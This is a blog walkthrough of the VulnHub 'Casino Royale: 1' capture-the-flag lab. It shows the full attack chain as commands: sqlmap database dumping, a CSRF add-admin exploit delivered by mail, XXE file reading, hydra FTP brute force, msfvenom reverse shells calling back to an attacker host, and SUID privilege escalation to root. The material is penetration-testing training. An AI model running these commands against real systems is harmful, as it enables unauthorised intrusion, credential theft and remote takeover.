<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Casino Royale: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/casino-royale-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-03-08T07:31:47+00:00">March 8, 2019</time><time class="updated" datetime="2025-06-10T20:11:49+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge <strong>“Casino Royale: 1”</strong>. It is a vulnerable lab presented by author creosote for helping pentesters to perform online penetration testing according to your experience level. The challenge is to get root on the Targeted Virtual Machine and read the flag.sh within that directory.</span></p>
<p><span style="color: #000000;"><strong>Difficulty: Intermediate </strong></span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;">IP discovery and Port Scanning.</span></li>
<li><span style="color: #000000;">Browsing the IP on port 8080.</span></li>
<li><span style="color: #000000;">Discovering accessible directories on the victim’s machine.</span></li>
<li><span style="color: #000000;">Searching exploits via searchsploit.</span></li>
<li><span style="color: #000000;">Using SQLMAP to find database and login credentials.</span></li>
<li><span style="color: #000000;">Browsing directories on the browser.</span></li>
<li><span style="color: #000000;">Adding Domain name to /etc/hosts file.</span></li>
<li><span style="color: #000000;">Searching exploits via searchsploit.</span></li>
<li><span style="color: #000000;">Using Cross-Site Request Forgery Exploit code.</span></li>
<li><span style="color: #000000;">Using telnet to connect to port 25.</span></li>
<li><span style="color: #000000;">Tail off the access.log file.</span></li>
<li><span style="color: #000000;">Browsing directories on a browser.</span></li>
<li><span style="color: #000000;">Exploiting XML External Entity vulnerability.</span></li>
<li><span style="color: #000000;">Using curl to send the file.</span></li>
<li><span style="color: #000000;">Creating a PHP shell using msfvenom.</span></li>
<li><span style="color: #000000;">Using hydra to brute force FTP login Password.</span></li>
<li><span style="color: #000000;">Logging into Ftp.</span></li>
<li><span style="color: #000000;">Using Multi/handler of Metasploit Framework.</span></li>
<li><span style="color: #000000;">Enumerating through directories.</span></li>
<li><span style="color: #000000;">Getting Login Credentials.</span></li>
<li><span style="color: #000000;">Looking for SUID file and directories.</span></li>
<li><span style="color: #000000;">Creating a bash shell using msfvenom.</span></li>
<li><span style="color: #000000;">Using Netcat listener to get a reverse shell.</span></li>
<li><span style="color: #000000;">Getting Root Access.</span></li>
<li><span style="color: #000000;">Reading the Flag.</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;">Let’s start off with discovering the IP address of our Target Machine.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DLJcMgeOa6c/XIILDsFEF8I/AAAAAAAAdVo/T8KdXzSp-OgpGTVR_jkypLC52bs0xjxRQCLcBGAs/s1600/1.png"/></p>
<p><span style="color: #000000;">Then we’ll continue with our <strong>nmap</strong> command to find out the open ports and services.</span></p>
<pre class="lang:default decode:true">nmap -sV -p- 192.168.1.102</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-C3BoMW0NhrE/XIILGWgrcLI/AAAAAAAAdWQ/FLEH5pOyWEUQD2yLLDs1yX6puzttR7Q3wCLcBGAs/s1600/2.png"/></p>
<p><span style="color: #000000;">Since <strong>port 80</strong> is open, we explored the Targets IP Address on the browser.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-OMceyLf53EA/XIILJ5rJx6I/AAAAAAAAdW8/a5kpuHedc4cSj1tm-P6TEGyP7UQeCL-iQCLcBGAs/s1600/3.png"/></p>
<p><span style="color: #000000;">We didn’t found anything on the webpage, so we used <strong>dirb</strong> <strong>tool</strong> to enumerate the directories on the Targets IP Address.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.102/</pre>
<p><span style="color: #000000;">Here, we found a useful directo</span><span style="color: #000000;">ry </span><strong style="color: #000000;">index.php</strong><span style="color: #000000;">. Moving on.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Qk1S6ru-bNo/XIILPi3Se1I/AAAAAAAAdX0/x8UehpZ96zsgqOtB0tYYmmnyzoT8fNqowCLcBGAs/s1600/6.png"/></p>
<p><span style="color: #000000;">We tried opening that directory <strong>index.php</strong> along <strong>with Targets IP Address</strong> in the browser. This page seems pretty interesting and gave us our next clue to proceed.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-oXvp4b7HSFY/XIILQHSHESI/AAAAAAAAdX4/VJFfgxa1dqQym9zJjZm4V4szcJKsT2qOQCLcBGAs/s1600/7.png"/></p>
<p><span style="color: #000000;">The page revealed a pokermax software term. This made us curious to look for it in searchsploit. And our intuition was right. We copied the exploits 6766.txt file on our machine and read it contents. It revealed a <strong>link</strong> which we tried opening in the browser.</span></p>
<pre class="lang:default decode:true">searchsploit poker
searchsploit -m 6766
cat 6766.txt</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-RUXRZHfAyk4/XIILQqoTyZI/AAAAAAAAdX8/ROCC-up-qBkjfYv1TXoLI00P5GR1Si7hwCLcBGAs/s1600/9.png"/></p>
<p><span style="color: #000000;">That link we opened directed us to Pokermax Poker League: Admin Login. Since we don’t any credentials time to bring up SQLMAP.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-6Gospou3yXI/XIILDog5OrI/AAAAAAAAdVk/9HBIS3ldPbs0qi2f_CGtdCYCtp3zfGFjACLcBGAs/s1600/10.png"/></p>
<p><span style="color: #000000;">Let’s first find the database.</span></p>
<pre class="lang:default decode:true">sqlmap -u http://192.168.1.102/pokeradmin/index.php --forms --risk 3 --level 5 --dbs --batch</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-LZ0qV0GU3J8/XIILDsmWD0I/AAAAAAAAdVg/7cxRlP0EQUMG-ZdIgNODM1q1Lg7kSDTcwCLcBGAs/s1600/11.png"/></p>
<p><span style="color: #000000;">The database we found is <strong>pokerleague.</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-WoftzmFyVMg/XIILEA6C_3I/AAAAAAAAdVs/D9fnMcoQwEIVhFH6-4ZPI8p8W1fZ53TFQCLcBGAs/s1600/12.png"/></p>
<p><span style="color: #000000;">Let’s look for the credentials of Admin Login in the database <strong>pokerleague</strong>.</span></p>
<pre class="lang:default decode:true">sqlmap -u http://192.168.1.102/pokeradmin/index.php --forms --risk 3 --level 5 -D pokerleague --dump-all --batch</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-TOMTEmMMKYQ/XIILEUA9ozI/AAAAAAAAdVw/ihXcRoNSPfoLHWwMEJPuaIb6UDc14XwFACLcBGAs/s1600/13.png"/></p>
<p><span style="color: #000000;">We have got the required credentials.</span></p>
<p><span style="color: #000000;"><strong>Username: admin</strong></span></p>
<p><span style="color: #000000;"><strong>Password: raise12million</strong></span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-E8Mt_Cac7sY/XIILEtKkN1I/AAAAAAAAdV0/vBerEYEwpEgR_1IKIhr_I3UVS72RCWHBgCLcBGAs/s1600/14.png"/></p>
<p><span style="color: #000000;">We have successfully logged into the Admin area. Looking for other clues.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-kusGHiWq_fg/XIILE1d0uHI/AAAAAAAAdV4/XV1XWsvKllw70PlgR8xnf1gJDfI_PMfoQCLcBGAs/s1600/15.png"/></p>
<p><span style="color: #000000;">After checking all the tabs on the page, we found some useful information in <strong>Edit info</strong> of player <strong>Valenka</strong>.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-n75ftgnCxik/XIILFM6DyZI/AAAAAAAAdV8/25F5jkpmyOkDS-4S7cojQl8uxzuKoHC3gCLcBGAs/s1600/16.png"/></p>
<p><span style="color: #000000;">We have got a useful <strong>directory</strong> in player profile; let’s find out where it’s going to lead us. Also, it asked us to update <strong>Domain Name</strong> <strong>casino-royale.local</strong> in our hosts file.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-vtw3q_iYIBI/XIILFdBOLII/AAAAAAAAdWA/vZxeArM56kYXNp7rRgrOdA5YfBLSgwqrQCLcBGAs/s1600/17.png"/></p>
<p><span style="color: #000000;">Updating the hosts file.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-1W56Ovck9Co/XIILFrEfsCI/AAAAAAAAdWE/mttdlna0otIJRbi-Qcs8xiNiBC_C-gN3ACLcBGAs/s1600/18.1.png"/></p>
<p><span style="color: #000000;">After opening the <strong>directory</strong> along with <strong>domain</strong> <strong>name</strong> in the <strong>browser</strong>, we found something interesting about <strong>port 25</strong> which was <strong>open</strong>. This information might come in handy.<img decoding="async" src="https://3.bp.blogspot.com/-fw3y0tIzBm0/XIILF5cPYRI/AAAAAAAAdWI/l7_O-Uzb6n4v4wp3Cb4X8HctrB9giUZ9ACLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Looking around we found a <strong>CMS Snowfox</strong>. Let’s find if it is on searchsploit.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-v1HsJfSrzMs/XIILGDPGI7I/AAAAAAAAdWM/3-6z15O0mFsxrmPW0HIiZVOvgOIJrc2BgCLcBGAs/s1600/19.png"/></p>
<p><span style="color: #000000;">We were right about it. There is an <strong>html</strong> <strong>file</strong> available about this exploit. So we copied the file to our machine.</span></p>
<pre class="lang:default decode:true">searchsploit snowfox
searchsploit -m 35301</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-VynXOvXhDe8/XIILGV0_ylI/AAAAAAAAdWU/UV7R2m3K_e82r5pZ7zhJM6n1GNJwpvGAACLcBGAs/s1600/20.png"/></p>
<p><span style="color: #000000;">On reading the contents of the file, we found a script for CROSS SITE REQUEST FORGERY (add admin). So we copied this code.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-RCszwLQn3XI/XIILGynfG8I/AAAAAAAAdWY/s6xiN8UhrakK4_C85MRjnERoORQPGKjAwCLcBGAs/s1600/21.png"/></p>
<p><span style="color: #000000;">Created a new file as <strong>raj.html</strong> and pasted the code in it, also we made some minor changes as you can see in the image.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-DpUD_MotRGA/XIILHJpj5iI/AAAAAAAAdWc/DqNoNj5uyTolA2cxYy5D8XAp39V7eI8IQCLcBGAs/s1600/22.png"/></p>
<p><span style="color: #000000;">After that, we have copied the file <strong>raj.html</strong> to <strong>/var/www/html</strong> folder of our machine. And restarted the service for apache2.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-fy0KwBkdLUM/XIILHd9QdRI/AAAAAAAAdWg/Xl9LGdNLpVYvBH01f38yrZOyUxwdJ1ANACLcBGAs/s1600/23.png"/></p>
<p><span style="color: #000000;">Let’s connect to port <strong>25</strong> using <strong>telnet</strong>. We will be <strong>sending</strong> a <strong>mail</strong> to recipient <strong>valenka</strong> along with the link of <strong>raj.html file</strong>. All the steps are shown in the image.</span></p>
<pre class="lang:default decode:true">telnet casino-royale.local 25</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-6aVm0He20KU/XIILHjM_IGI/AAAAAAAAdWk/APptrywlWOAEfIra6iO6yI8WLGOtxOJMgCLcBGAs/s1600/24.png"/></p>
<p><span style="color: #000000;">We have just tail off the access log of apache2.</span></p>
<pre class="lang:default decode:true">tail -n1 -f /var/log/apache2/access.log</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-23CSuzjIUD0/XIILHz_vn_I/AAAAAAAAdWo/9mtr_3K0OpkLM30T16aAQrCLlqCzevz2wCLcBGAs/s1600/25.png"/></p>
<p><span style="color: #000000;">Let’s Login with the credentials, we have given in the raj.html file in the <strong>Signin</strong> <strong>section</strong> of the page <strong>casino-royale.local/vip-client-portfolios/?uri=signin</strong></span></p>
<p><span style="color: #000000;"><strong>Email address: </strong><a style="color: #000000;" href="mailto:user@user.local"><strong>user@user.local</strong></a></span></p>
<p><span style="color: #000000;"><strong>Password: password</strong></span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-xQn6xCyk8Xs/XIILIOjOrdI/AAAAAAAAdWs/5y9tWwv7YEUrAIiqvyNc4VmHdEkM_k1KACLcBGAs/s1600/26.png"/></p>
<p><span style="color: #000000;">After successfully logging in, we found another clue in Edit of <a style="color: #000000;" href="mailto:le@casino-royale.local">le@casino-royale.local</a> in manage players.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-y-usy49IX-I/XIILIHKYRoI/AAAAAAAAdWw/Uhl4g0oL2NgYuZPJuJzbi_YwKV0RnvFVACLcBGAs/s1600/27.png"/></p>
<p><span style="color: #000000;">Another directory clue let’s open it in the browser and look what it holds.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-wOaOX6jTtjQ/XIILI4SS16I/AAAAAAAAdW0/nf4gUANHaH4UbiKwtqoeReLnDV2kmZ1tACLcBGAs/s1600/28.png"/></p>
<p><span style="color: #000000;">We landed on this page.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-lMHOpUtAvUQ/XIILJC1EIHI/AAAAAAAAdW4/c1fP-7ZE7roM0rDtIjvEbk6MyIN3NaSIACLcBGAs/s1600/29.png"/></p>
<p><span style="color: #000000;">Since that page doesn’t seem useful from outside. So, we checked its Page Source. This gave us a hint to use an <strong>XML External Entity injection</strong> for our next step.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-to_tbE-5zbg/XIILKN0gAlI/AAAAAAAAdXA/uCMPPSSyIxEONYRKJDxDY2qO-9wV-t8KACLcBGAs/s1600/30.png"/></p>
<p><span style="color: #000000;">So we looked for a <strong>code</strong> for <strong>XML External Entity injection online</strong>. Therefore, we created a new file <strong>xml.txt</strong> and pasted the code by making some minor changes.</span></p>
<p><span style="color: #000000;"><strong>https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DlTceODFROo/XIILKXSBqnI/AAAAAAAAdXE/YXCf_266-F0i9dECB-kUpJDPwwpxiwYDwCLcBGAs/s1600/31.png"/></p>
<p><span style="color: #000000;">Let’s send our <strong>XML External Entity Injection</strong> in <strong>file</strong> <strong>xml.txt</strong> using curl.</span></p>
<pre class="lang:default decode:true">curl -d @xml.txt http://casino-royale.local/ultra-access-view/main.php</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-XCADM7OZQ3I/XIILK-r1azI/AAAAAAAAdXI/v9Op_k27-DI6A21s25Jd0u4kSYF7JBFnQCLcBGAs/s1600/32.png"/></p>
<p><span style="color: #000000;">After exploiting the XML External Entity vulnerability, it gave us the <strong>/etc/passwd</strong> file. This contained a username for FTP Login i.e <strong>ftpUserULTRA</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-kokax3nI8_U/XIILKz6DdcI/AAAAAAAAdXM/ythxI19kDAYgP9ipVn4dO-cW8to_BzHkwCLcBGAs/s1600/33.png"/></p>
<p><span style="color: #000000;">We have created a <strong>PHP shell</strong> payload using <strong>msfvenom</strong>.</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.107 lport=443 -f raw &gt; shell.php5</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-DkPxeu7q1gM/XIILLEr5eTI/AAAAAAAAdXQ/FpDQK7yE9eMev2W0cUeAB_RC1rP1z0NAACLcBGAs/s1600/34.png"/></p>
<p><span style="color: #000000;">We have used <strong>hydra</strong> to find the <strong>password</strong> of username <strong>ftpUserULTRA</strong> for <strong>Ftp Login. </strong>We have cracked the password for ftp login i.e <strong>bankbank</strong></span></p>
<pre class="lang:default decode:true">hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.102</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-VXIzqai4Qt0/XIILLRze-fI/AAAAAAAAdXU/S_FEagX47QQEQ3KDlJVE1l_tJ_3yPwvRQCLcBGAs/s1600/35.1.png"/></p>
<p><span style="color: #000000;">Let’s just <strong>Login into FTP</strong>, after quiet messing up we are only able to send <strong>.php5</strong> files or files with<strong> no extension</strong>.  Time to upload our shell and gave permissions to execute.</span></p>
<pre class="lang:default decode:true">ftp 192.168.1.102 21
put shell.php5
chmod 777 shell.php5</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-mnIYBo1n4uc/XIILMMiBbbI/AAAAAAAAdXY/pqx_n1mYQSIUd1rnLHhOV7r9uV2GPohowCLcBGAs/s1600/35.png"/></p>
<p><span style="color: #000000;">After uploading our shell, we set up a listener using Metasploit-framework.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.107
msf exploit(multi/handler) &gt; set lport 443
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;">We got the reverse shell, but it is not a proper shell. We will spawn a tty shell using python.</span></p>
<pre class="lang:default decode:true ">shell
python -c "import pty; pty.spawn('/bin/bash')"</pre>
<p><span style="color: #000000;">After enumerating through directories, we found a useful file config.php. Let’s check </span>it<span style="color: #000000;"> contents.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-Pn26uZmuiak/XIILMlXfP7I/AAAAAAAAdXc/RjCCBnjkn9ssv2VfQquzP0FNRKk73V7bgCLcBGAs/s1600/36.png"/></p>
<p><span style="color: #000000;">We when we read the contents of config.php. It gave us two useful credentials.</span></p>
<p><span style="color: #000000;"><strong>DBusername: valenka</strong></span></p>
<p><span style="color: #000000;"><strong>DBpassword: 11archives11!</strong></span></p>
<p><span style="color: #000000;">So, we used these credentials to login into Valenka.</span></p>
<pre class="lang:default decode:true">su valenka
password: 11archives11!</pre>
<p><span style="color: #000000;">After that, we tried to find files with SUID bit permissions.</span></p>
<pre class="lang:default decode:true">find / -perm -4000 2&gt;/dev/null</pre>
<p><span style="color: #000000;">Here we found an interesting <strong>Suid file and directory.</strong></span></p>
<p><span style="color: #000000;"><strong>/opt/casino-royale/mi6_detect_test</strong></span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-LkAsi63C40I/XIILNPxKhtI/AAAAAAAAdXg/7qAMh52vXIYBr_lTMYunVmu4rFRq-sXsgCLcBGAs/s1600/37.png"/></p>
<p><span style="color: #000000;">On running the <strong>SUID file</strong>, we see it is most likely using a <strong>run.sh</strong> file but there no such file or directory. <strong>Since the run.sh has no permissions</strong>.  So we decided to move to <strong>/tmp</strong> directory.</span></p>
<pre class="lang:default decode:true">/opt/casino-royale/mi6_detect_test
cd /opt/casino-royale/
ls
cd /tmp</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-4gpDqKcVbm8/XIILNkps4OI/AAAAAAAAdXk/jkeCiRnocBkDMI48wmqLQnpwIwoMmjDjACLcBGAs/s1600/38.png"/></p>
<p><span style="color: #000000;">We need to create a bash code using Msfvenom:</span></p>
<pre class="lang:default decode:true">msfvenom –p cmd/unix/reverse_netcat lhost=192.168.1.107 lport=1234 R</pre>
<p><span style="color: #000000;">After that, we have copied the code in <strong>run.sh</strong> and executed python server.</span></p>
<pre class="lang:default decode:true">nano run.sh
python -m SimpleHTTPServer</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-6hTzFHvi6Dw/XIILOFStxwI/AAAAAAAAdXo/kcIWYRweitsN1KzSk7brj4Cpv1esHOzLACLcBGAs/s1600/39.png"/></p>
<p><span style="color: #000000;">We have downloaded the file in the /tmp directory. Again ran the SUID file.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.107:8000/run.sh
/opt/casino-royale/mi6_detect_test</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-Bm432Jagido/XIILOkxsFAI/AAAAAAAAdXs/8NOifrhkC7koDg_DIU6iECI5--soYLUcgCLcBGAs/s1600/40.png"/></p>
<p><span style="color: #000000;">This time on running the SUID file, it gave a <strong>reverse shell</strong> on our <strong>netcat listener</strong>.  Finally, we have got the <strong>root access</strong> and read the FLAG!!</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
id
cd/root
ls
cd flag
cat flag.sh</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/--wLAFvJnV7E/XIIZIE0LjPI/AAAAAAAAdYc/9dVmEv5fklc5KOmsgUqhqSesC-srXJgxQCLcBGAs/s1600/41.png"/></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
